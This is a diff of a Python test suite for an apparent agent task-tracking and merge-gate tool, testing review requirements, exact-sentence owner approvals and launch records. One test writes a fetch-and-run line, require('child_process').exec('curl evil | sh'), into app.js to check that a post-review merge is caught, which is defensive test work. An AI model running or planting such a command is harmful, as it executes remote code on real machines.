@@ -1,35 +1,38 @@
-"""Failing tests for check-blocks, slice 2: agent-file.sh carries the blocks.
-Written by the task manager before any code.
+"""Tests of agent-checks, one class per feature."""
 
-Rules: requirements/check-blocks.md, section 2 (process rules), section 7 (todo est)
-and 9 C3 (contract).
-
-    todo add --checks --scope     the planned brief blocks and the task's files on the todo line
-    todo checks                   add blocks; --remove only on a verified owner order
-    todo builder                  who built the task (the gate refuses a diff read, flow or UI check by them)
-    todo est                      re-estimate in place
-    check                         one result line per block (CHECK ... in agent_state.txt)
-    checks gate                   the merge guard: refuses while a planned block has no pass line
-    next                          the queued tasks that can start now
-    todo done                     releases the tasks queued after it
-    edge add                      one edge= line in agent_repo.conf
-
-Run: python3 -m unittest tests.test_check_results
-"""
-
-import json
 import os
-import re
-import subprocess
 import sys
-import time
 import unittest
 
 HERE = os.path.dirname(os.path.abspath(__file__))
-sys.path.insert(0, HERE)
+if HERE not in sys.path:
+    sys.path.insert(0, HERE)
+import os  # noqa: E402
+import json  # noqa: E402
+import re  # noqa: E402
+import subprocess  # noqa: E402
+import time  # noqa: E402
 from scripthelp import ScriptCase  # noqa: E402
+import tempfile  # noqa: E402
 
-LINE_DATE = re.compile(r" \| \d{4}-\d{2}-\d{2} \d{2}:\d{2}$")
+
+HERE = os.path.dirname(os.path.abspath(__file__))
+
+
+ROOT = os.path.dirname(HERE)
+
+
+def only_own(cls):
+    own = set(vars(cls))
+    for name in dir(cls):
+        if name.startswith("test") and name not in own:
+            setattr(cls, name, None)
+    return cls
+
+
+def read(*parts):
+    with open(os.path.join(ROOT, *parts)) as fh:
+        return fh.read()
 
 
 class Case(ScriptCase):
@@ -71,7 +74,16 @@ class Case(ScriptCase):
             return fh.read()
 
 
-# ---------------------------------------------------------------- todo add --checks --scope
+def main_launched(repo_dir, *tasks, at=None):
+    """Section 44 F2: the guard's durable records of a reviewer and a check deputy launched by the main manager.
+    Section 47 G8: dated within the task instance (default: now)."""
+    at = at or time.strftime("%Y-%m-%d %H:%M")
+    gd = subprocess.run(["git", "-C", repo_dir, "rev-parse", "--path-format=absolute", "--git-common-dir"],
+                        capture_output=True, text=True, check=True).stdout.strip()
+    with open(os.path.join(gd, "agent_launches.jsonl"), "a") as fh:
+        for t in tasks:
+            for kind in ("reviewer", "check-deputy"):
+                fh.write(json.dumps({"task": t, "type": kind, "by": "main", "at": at}) + "\n")
 
 
 class TestTodoAddChecks(Case):
@@ -195,9 +207,6 @@ class TestTodoChecks(Case):
         self.assertEqual(os.path.realpath(repo_arg), os.path.realpath(self.repo.dir))
 
 
-# ---------------------------------------------------------------- todo est
-
-
 class TestTodoEst(Case):
 
     def test_est_and_guess_replaced_in_place_rest_stays(self):
@@ -229,9 +238,6 @@ class TestTodoEst(Case):
         self.refused("todo", "est", "t", "ten")
         self.refused("todo", "est", "t", "0")
         self.refused("todo", "est", "t")
-
-
-# ---------------------------------------------------------------- check: one result line per block
 
 
 class TestCheckLine(Case):
@@ -277,21 +283,6 @@ class TestCheckLine(Case):
                 r = self.af(*args)
                 self.assertEqual(r.returncode, 1, r.stdout + r.stderr)
                 self.assertEqual(self.state(), before)
-
-
-# ---------------------------------------------------------------- checks gate: the merge guard
-
-
-def main_launched(repo_dir, *tasks, at=None):
-    """Section 44 F2: the guard's durable records of a reviewer and a check deputy launched by the main manager.
-    Section 47 G8: dated within the task instance (default: now)."""
-    at = at or time.strftime("%Y-%m-%d %H:%M")
-    gd = subprocess.run(["git", "-C", repo_dir, "rev-parse", "--path-format=absolute", "--git-common-dir"],
-                        capture_output=True, text=True, check=True).stdout.strip()
-    with open(os.path.join(gd, "agent_launches.jsonl"), "a") as fh:
-        for t in tasks:
-            for kind in ("reviewer", "check-deputy"):
-                fh.write(json.dumps({"task": t, "type": kind, "by": "main", "at": at}) + "\n")
 
 
 class TestGate(Case):
@@ -656,9 +647,6 @@ class TestGate(Case):
         self.assertIn("builder u Deputy", self.fields("u"))
 
 
-# ---------------------------------------------------------------- next + todo done release
-
-
 class TestNext(Case):
 
     def add(self, name, *extra):
@@ -737,9 +725,6 @@ class TestNext(Case):
         self.assertIn("waiting queue", self.line("b"))
 
 
-# ---------------------------------------------------------------- edge add
-
-
 class TestEdgeAdd(Case):
 
     def conf(self):
@@ -768,5 +753,448 @@ class TestEdgeAdd(Case):
         self.assertEqual(r.returncode, 1)
 
 
-if __name__ == "__main__":
-    unittest.main()
+BIN = os.path.join(ROOT, "bin")
+
+
+VERIFIED = "#!/usr/bin/env bash\necho verified\nexit 0\n"
+
+
+@only_own
+class Gate(TestGate):
+    def setUp(self):
+        super().setUp()
+        self.repo.write_bin_script("agent-owner-order.sh", VERIFIED)
+
+    def head(self):
+        return self.git("rev-parse", "HEAD").strip()
+
+    def all_pass_but(self, *missing, task="t"):
+        for b in ("DIFF SCAN", "BUILD", "RELATED TESTS"):
+            if b not in missing:
+                self.ok("check", task, b, "pass", "--by", "tm", "--evidence", "ok")
+        if "PR REVIEW" not in missing:
+            self.ok("check", task, "PR REVIEW", "pass", "--by", task + " Review", "--evidence", "read it")
+
+
+@only_own
+class TestG1Removals(Gate):
+    def test_pr_review_is_never_removed(self):
+        r = self.af("todo", "checks", "t", "--remove", "PR REVIEW", "--owner-quote", "skip the review for this one")
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("todo checks: PR REVIEW is never removed", r.stdout + r.stderr)
+        self.all_pass_but("PR REVIEW")
+        self.assertEqual(self.gate().returncode, 1)
+
+    def test_owner_sign_is_never_removed(self):
+        r = self.af("todo", "checks", "t", "--remove", "OWNER SIGN", "--owner-quote", "no need to sign this one")
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("todo checks: OWNER SIGN is never removed", r.stdout + r.stderr)
+
+    def test_words_that_do_not_name_the_block_are_refused(self):
+        r = self.af("todo", "checks", "t", "--remove", "RELATED TESTS", "--owner-quote",
+                    "please fix the footer typo on the site")
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("todo checks: ask the owner to type exactly: yes, skip RELATED TESTS for t", r.stdout + r.stderr)   # section 51 H2: the exact sentence
+        self.all_pass_but("RELATED TESTS")
+        self.assertEqual(self.gate().returncode, 1)
+
+    def test_words_that_name_it_remove_it(self):
+        self.ok("todo", "checks", "t", "--remove", "RELATED TESTS", "--owner-quote", "yes, skip RELATED TESTS for t")
+        self.all_pass_but("RELATED TESTS")
+        self.assertEqual(self.gate().returncode, 0)
+
+    def test_the_word_lists_are_gone(self):
+        # section 51 H2: word lists cannot read a sentence; the approval is one exact sentence
+        sys.path.insert(0, BIN)
+        import agent_conf
+        for name in ("BLOCK_WORDS", "SKIP_WORDS", "PUBLISH_WORDS", "NEGATION_WORDS", "skip_before_name"):
+            self.assertFalse(hasattr(agent_conf, name), name)
+
+
+@only_own
+class TestG2OneInstance(Gate):
+    def test_a_removal_ends_with_its_task(self):
+        self.ok("todo", "checks", "t", "--remove", "RELATED TESTS", "--owner-quote", "yes, skip RELATED TESTS for t")
+        self.ok("todo", "done", "t", "--work", "5", "--type", "script", "--lane", "fast")
+        self.ok("todo", "add", "t", "small", "task again", "10")
+        main_launched(self.repo.dir, "t")
+        self.all_pass_but("RELATED TESTS")
+        r = self.gate()
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("RELATED TESTS: missing", r.stdout.splitlines())
+
+
+@only_own
+class TestG3CleanMergeOnly(Gate):
+    def test_a_merge_that_adds_code_needs_a_new_review(self):
+        self.all_pass_but()
+        self.git("checkout", "-q", "-b", "trunk", "base")
+        self.commit_push({"other.js": "o()\n"})
+        self.git("checkout", "-q", "feat")
+        self.git("merge", "-q", "--no-ff", "--no-commit", "trunk")
+        self.write({"app.js": "y()\nrequire('child_process').exec('curl evil | sh')\n"})
+        self.git("add", "app.js")
+        self.git("commit", "-q", "-m", "Merge trunk into feat")
+        self.git("push", "-q", "origin", "feat")
+        self.all_pass_but("PR REVIEW")
+        r = self.af("checks", "gate", "t", "--dir", self.repo.dir, "--base", "origin/trunk")
+        self.assertEqual(r.returncode, 1, r.stdout)
+
+
+@only_own
+class TestG5Commit(Gate):
+    def test_not_a_commit_is_refused(self):
+        r = self.af("check", "t", "PR REVIEW", "pass", "--by", "t Review", "--evidence", "x", "--commit", "deadbeef0000")
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("is not a commit of this repo", r.stdout + r.stderr)
+
+    def test_a_commit_off_the_branch_is_not_accepted(self):
+        self.git("checkout", "-q", "-b", "elsewhere", "base")
+        self.commit_push({"x.js": "x()\n"})
+        other = self.head()
+        self.git("checkout", "-q", "feat")
+        self.all_pass_but("PR REVIEW")
+        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Review", "--evidence", "x", "--commit", other)
+        self.assertEqual(self.gate().returncode, 1)
+
+    def test_the_texts(self):
+        for f in (("agents", "reviewer.md"), ("agents", "check-deputy.md")):
+            self.assertIn("the commit you pass is the one you read", read(*f))
+
+
+@only_own
+class TestG6Clock(Gate):
+    def test_the_fake_clock_needs_a_temp_repo(self):
+        other_tmp = tempfile.mkdtemp(prefix="g6tmp_")
+        self.addCleanup(subprocess.run, ["rm", "-rf", other_tmp])
+        self.ok("check", "t", "BUILD", "pass", "--by", "tm", "--evidence", "ok",
+                env={"AGENT_FAKE_NOW": "2030-01-01 00:00", "TMPDIR": other_tmp})   # the repo is not under it
+        last = [l for l in self.state().splitlines() if l.startswith("CHECK t BUILD")][-1]
+        self.assertNotIn("2030-01-01", last)
+
+    def test_a_line_from_the_future_is_ignored(self):
+        self.all_pass_but("PR REVIEW")
+        with open(os.path.join(self.repo.dir, "agent_state.txt"), "a") as fh:
+            fh.write("CHECK t PR REVIEW: pass | by t Review | at %s | ok | 2099-01-01 00:00\n" % self.head()[:12])
+        r = self.gate()
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("PR REVIEW: missing", r.stdout.splitlines())
+
+
+@only_own
+class TestG8(Gate):
+    def test_the_builder_by_its_todo_name_is_refused(self):
+        self.ok("todo", "builder", "t", "t Dev")
+        self.all_pass_but("PR REVIEW")
+        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Dev", "--evidence", "my own review")
+        self.assertEqual(self.gate().returncode, 1)
+
+    def test_a_launch_before_the_task_opened_does_not_count(self):
+        gd = self.git("rev-parse", "--path-format=absolute", "--git-common-dir").strip()
+        os.remove(os.path.join(gd, "agent_launches.jsonl"))
+        main_launched(self.repo.dir, "t", at="2000-01-01 00:00")
+        self.all_pass_but()
+        r = self.gate()
+        self.assertEqual(r.returncode, 1, r.stdout)
+
+
+@only_own
+class TestH1AtTheHead(Gate):
+    def test_an_owner_sign_on_an_earlier_commit_is_refused(self):
+        self.ok("todo", "checks", "t", "OWNER SIGN")
+        self.all_pass_but()
+        self.ok("check", "t", "OWNER SIGN", "pass", "--by", "owner", "--owner-quote", "yes merge it")   # signs c1
+        self.commit_push({"app.js": "z()\n"})                                       # c2 changes more
+        self.all_pass_but()
+        r = self.gate()
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertTrue([l for l in r.stdout.splitlines() if l.startswith("OWNER SIGN: pass at ")], r.stdout)
+
+    def test_a_db_check_on_an_earlier_commit_is_refused(self):
+        self.ok("todo", "checks", "t", "DB CHECK")
+        self.all_pass_but()
+        self.ok("check", "t", "DB CHECK", "pass", "--by", "t Check", "--evidence", "migration ran")
+        self.commit_push({"app.js": "z()\n"})
+        self.all_pass_but()
+        r = self.gate()
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertTrue([l for l in r.stdout.splitlines() if l.startswith("DB CHECK: pass at ")], r.stdout)
+
+    def test_the_documented_sign_command_passes_the_head(self):
+        line = [l for l in read("skills", "dispatch", "SKILL.md").splitlines()
+                if "OWNER SIGN" in l and "agent-file.sh check" in l][0]
+        self.assertIn("--commit <head>", line)
+
+
+def minute(delta_s=0):
+    return time.strftime("%Y-%m-%d %H:%M", time.localtime(time.time() + delta_s))
+
+
+@only_own
+class TestF2Launches(TestGate):
+    def launches_file(self):
+        return os.path.join(self.git("rev-parse", "--path-format=absolute", "--git-common-dir").strip(),
+                            "agent_launches.jsonl")
+
+    def set_launch(self, by, at="2000-01-01 00:00"):
+        with open(self.launches_file(), "w") as fh:
+            fh.write(json.dumps({"task": "t", "type": "reviewer", "by": by, "at": at}) + "\n")
+
+    def review(self):
+        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
+        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Reviewer", "--evidence", "read it")
+
+    def test_no_launch_record_is_refused(self):
+        os.remove(self.launches_file())
+        self.review()
+        r = self.gate()
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("PR REVIEW: no reviewer launched by the main manager for t, not accepted", r.stdout.splitlines())
+
+    def test_a_reviewer_the_builder_launched_does_not_count(self):
+        self.set_launch("tm")
+        self.review()
+        self.assertEqual(self.gate().returncode, 1)
+
+    def test_a_pass_older_than_the_launch_does_not_count(self):
+        self.review()
+        self.set_launch("main", at="2099-01-01 00:00")
+        self.assertEqual(self.gate().returncode, 1)
+
+    def test_with_the_record_it_passes(self):
+        self.review()
+        r = self.gate()
+        self.assertEqual(r.returncode, 0, r.stdout)
+
+    def test_the_fake_clock_only_in_tests(self):
+        self.ok("check", "t", "BUILD", "pass", "--by", "tm", "--evidence", "ok",
+                env={"AGENT_TESTING": "", "AGENT_FAKE_NOW": "2030-01-01 00:00"})
+        last = [l for l in self.state().splitlines() if l.startswith("CHECK t BUILD")][-1]
+        self.assertNotIn("2030-01-01", last)
+
+
+@only_own
+class TestF3Commits(TestGate):
+    def head(self):
+        return self.git("rev-parse", "HEAD").strip()
+
+    def review(self):
+        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
+        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Reviewer", "--evidence", "read it")
+
+    def test_the_line_records_the_commit(self):
+        self.review()
+        last = [l for l in self.state().splitlines() if l.startswith("CHECK t PR REVIEW")][-1]
+        self.assertIn("| at %s |" % self.head()[:12], last)
+
+    def test_a_pass_on_an_older_commit_is_refused(self):
+        self.review()
+        self.commit_push({"app.js": "z()\n"})
+        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
+        r = self.gate()
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertTrue([l for l in r.stdout.splitlines()
+                         if re.match(r"^PR REVIEW: pass at \w+, not at the head \w+, not accepted$", l)], r.stdout)
+
+    def test_a_later_merge_of_the_base_is_fine(self):
+        self.review()
+        self.git("checkout", "-q", "-b", "trunk", "base")
+        self.commit_push({"other.js": "o()\n"})
+        self.git("checkout", "-q", "feat")
+        self.git("merge", "-q", "--no-ff", "-m", "Merge trunk into feat", "trunk")
+        self.git("push", "-q", "origin", "feat")
+        r = self.af("checks", "gate", "t", "--dir", self.repo.dir, "--base", "origin/trunk")
+        self.assertEqual(r.returncode, 0, r.stdout)
+
+    def test_dir_must_be_on_the_branch(self):
+        self.review()
+        self.commit_push({"app.js": "w()\n"}, push=False)                  # --dir is ahead of origin/feat
+        r = self.gate("--branch", "feat")
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("GATE REFUSED t: --dir is not on origin/feat", r.stdout)
+
+    def test_a_line_without_a_commit_is_not_accepted(self):
+        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
+        with open(os.path.join(self.repo.dir, "agent_state.txt"), "a") as fh:     # appended by hand, no `at`
+            fh.write("CHECK t PR REVIEW: pass | by t Reviewer | read it | %s\n" % minute(60))
+        r = self.gate()
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("PR REVIEW: pass with no commit, not accepted", r.stdout.splitlines())
+
+    def test_lines_before_the_task_opened_are_ignored(self):
+        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
+        with open(os.path.join(self.repo.dir, "agent_state.txt"), "a") as fh:
+            fh.write("CHECK t PR REVIEW: pass | by t Reviewer | at %s | read it | 2001-01-01 00:00\n" % self.head()[:12])
+        r = self.gate()
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("PR REVIEW: missing", r.stdout.splitlines())
+
+
+@only_own
+class TestF5Tie(TestGate):
+    def test_same_minute_fail_wins(self):
+        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
+        env = {"AGENT_FAKE_NOW": minute()}
+        self.ok("check", "t", "PR REVIEW", "fail", "--by", "t Reviewer", "--evidence", "broken", env=env)
+        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Reviewer", "--evidence", "ok", env=env)
+        self.assertEqual(self.gate().returncode, 1)
+
+
+@only_own
+class TestF11Removals(TestGate):
+    def setUp(self):
+        super().setUp()
+        self.repo.write_bin_script("agent-owner-order.sh", "#!/usr/bin/env bash\necho verified\nexit 0\n")
+
+    def test_a_verified_removal_is_subtracted_by_the_gate(self):
+        r = self.af("todo", "checks", "t", "--remove", "RELATED TESTS", "--owner-quote", "yes, skip RELATED TESTS for t")   # section 51 H2: the exact sentence
+        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
+        self.passes("DIFF SCAN", "BUILD")
+        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Reviewer", "--evidence", "read it")
+        r = self.gate()
+        self.assertEqual(r.returncode, 0, r.stdout)
+
+    def test_brief_blocks_survive_drop_and_add(self):
+        self.ok("todo", "add", "t2", "small", "x", "10", "--checks", "EXAMPLES TEST")
+        self.ok("todo", "drop", "t2", "started again")
+        self.ok("todo", "add", "t2", "small", "x", "10")
+        main_launched(self.repo.dir, "t2")
+        for b in ("DIFF SCAN", "BUILD", "RELATED TESTS"):
+            self.ok("check", "t2", b, "pass", "--by", "tm", "--evidence", "ok")
+        self.ok("check", "t2", "PR REVIEW", "pass", "--by", "t2 Reviewer", "--evidence", "ok")
+        r = self.af("checks", "gate", "t2", "--dir", self.repo.dir, "--base", "base")
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("EXAMPLES TEST: missing", r.stdout.splitlines())
+
+
+@only_own
+class TestA1AnotherCheckout(TestGate):
+    """The reviewer's shell sits in the main checkout (the working branch); the task is in its own worktree."""
+
+    def setUp(self):
+        super().setUp()
+        self.wt = os.path.join(self.repo.base, "task_wt")
+        self.git("worktree", "add", "-q", "-b", "feat2", self.wt, "feat")
+        self.commit_push({"app.js": "w()\n"}, cwd=self.wt)
+        self.head = self.git("rev-parse", "HEAD", cwd=self.wt).strip()
+        self.git("checkout", "-q", "base")                       # the main checkout is elsewhere
+
+    def gate_wt(self):
+        return self.af("checks", "gate", "t", "--dir", self.wt, "--base", "base", "--branch", "feat2")
+
+    def lines_from_the_main_checkout(self, *extra):
+        for b in ("DIFF SCAN", "BUILD", "RELATED TESTS"):
+            self.ok("check", "t", b, "pass", "--by", "tm", "--evidence", "ok", *extra)
+        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Review", "--evidence", "read it", *extra)
+
+    def test_without_commit_it_is_refused_and_names_both(self):
+        self.lines_from_the_main_checkout()
+        r = self.gate_wt()
+        self.assertEqual(r.returncode, 1, r.stdout)
+        base = self.git("rev-parse", "HEAD").strip()
+        # section 50 G9: the main checkout's commit is not one of this branch's commits; both commits named (A1)
+        self.assertIn("PR REVIEW: pass at %s, not a commit of this branch (head %s), not accepted"
+                      % (base[:12], self.head[:12]), r.stdout.splitlines())
+
+    def test_with_commit_it_passes(self):
+        self.lines_from_the_main_checkout("--commit", self.head)
+        r = self.gate_wt()
+        self.assertEqual(r.returncode, 0, r.stdout)
+
+
+ASK = "ask the owner to type exactly: "   # section 51 H2 (was: ask him one plain question)
+
+
+@only_own
+class TestG9(Gate):
+    def test_old_passes_do_not_carry_to_a_new_instance(self):
+        self.all_pass_but()
+        self.ok("check", "t", "OWNER SIGN", "pass", "--by", "owner", "--owner-quote", "yes sign it")
+        self.ok("todo", "done", "t", "--work", "5", "--type", "script", "--lane", "fast")
+        self.ok("todo", "add", "t", "small", "another change", "10", "--checks", "PR REVIEW")
+        main_launched(self.repo.dir, "t")
+        self.git("checkout", "-q", "-b", "other", "base")
+        self.commit_push({"app.js": "unrelated()\n"})
+        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Review", "--evidence", "read it")   # only a new review
+        r = self.af("checks", "gate", "t", "--dir", self.repo.dir, "--base", "base")
+        self.assertEqual(r.returncode, 1, r.stdout)
+        for block in ("DIFF SCAN", "BUILD", "RELATED TESTS"):
+            with self.subTest(block=block):
+                self.assertNotIn("%s: pass" % block, r.stdout)
+
+    def test_a_line_a_minute_before_the_task_opened_is_ignored(self):
+        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
+        line = [l for l in open(os.path.join(self.repo.dir, "agent_todo.txt")) if l.startswith("t | ")][0]
+        opened = line.split("opened ")[1][:16]
+        t0 = time.mktime(time.strptime(opened, "%Y-%m-%d %H:%M"))
+        before = time.strftime("%Y-%m-%d %H:%M", time.localtime(t0 - 60))
+        with open(os.path.join(self.repo.dir, "agent_state.txt"), "a") as fh:
+            fh.write("CHECK t PR REVIEW: pass | by t Review | at %s | ok | %s\n" % (self.head()[:12], before))
+        r = self.gate()
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn("PR REVIEW: missing", r.stdout.splitlines())
+
+
+@only_own
+class TestG11Removals(Gate):
+    def test_loose_words_are_refused(self):
+        for block, words in (("BUILD", "no need to worry about the build server today"),
+                             ("CORE REVIEW", "the review went fine yesterday, ship it without the banner"),
+                             ("FLOW CHECK", "the flow on the screen looks good, no need to change it")):
+            with self.subTest(block=block):
+                r = self.af("todo", "checks", "t", "--remove", block, "--owner-quote", words)
+                self.assertEqual(r.returncode, 1, r.stdout)
+                self.assertIn(ASK, r.stdout + r.stderr)
+
+    def test_the_exact_sentence(self):
+        # section 51 H2: only the exact sentence (case, punctuation and spaces aside)
+        for block, words in (("BUILD", "Yes, skip BUILD for t."), ("RELATED TESTS", "yes skip related tests for t")):
+            with self.subTest(words=words):
+                r = self.af("todo", "checks", "t", "--remove", block, "--owner-quote", words)
+                self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
+
+    def test_the_task_request_itself_removes_nothing(self):
+        r = self.af("todo", "checks", "t", "--remove", "DB CHECK", "--owner-quote", "remove the db column legacy_note")
+        self.assertEqual(r.returncode, 1, r.stdout)
+        self.assertIn(ASK + "yes, skip DB CHECK for t", r.stdout + r.stderr)
+
+
+@only_own
+class TestG15Refusal(Gate):
+    def test_an_unclean_merge_says_so(self):
+        self.all_pass_but()
+        self.git("checkout", "-q", "-b", "trunk", "base")
+        self.commit_push({"other.js": "o()\n"})
+        self.git("checkout", "-q", "feat")
+        self.git("merge", "-q", "--no-ff", "--no-commit", "trunk")
+        self.write({"app.js": "y()\nextra()\n"})
+        self.git("add", "app.js")
+        self.git("commit", "-q", "-m", "Merge trunk into feat")
+        self.git("push", "-q", "origin", "feat")
+        r = self.af("checks", "gate", "t", "--dir", self.repo.dir, "--base", "origin/trunk")
+        self.assertTrue([l for l in r.stdout.splitlines()
+                         if l.startswith("PR REVIEW: the merge after the review changed code (")
+                         and l.endswith("): review the new head")], r.stdout)
+
+
+def rule(start, end):
+    text = read("PRINCIPLES.md")
+    return text[text.index(start):text.index(end)]
+
+
+@only_own
+class TestF2CoreReviewIsNoBuildersJob(TestGate):
+    def test_a_core_review_by_the_task_manager_is_refused(self):
+        self.passes("DIFF SCAN", "BUILD", "RELATED TESTS")
+        self.ok("check", "t", "PR REVIEW", "pass", "--by", "t Reviewer", "--evidence", "read it")
+        self.ok("check", "t", "CORE REVIEW", "pass", "--by", "t Task Manager", "--evidence", "read it")
+        sys.path.insert(0, BIN)
+        import agent_checks
+        self.assertIn("CORE REVIEW", agent_checks.BUILDER_BLOCKS)
+        r = self.gate()
+        if "CORE REVIEW" in r.stdout:
+            self.assertIn("CORE REVIEW: pass by the builder (t Task Manager), not accepted", r.stdout.splitlines())
+
+    def test_r8_names_it(self):
+        self.assertIn("CORE REVIEW", [x for x in rule("R8. ", "W1. ").splitlines()
+                                      if "builder" in x and "PR REVIEW" in x][0])
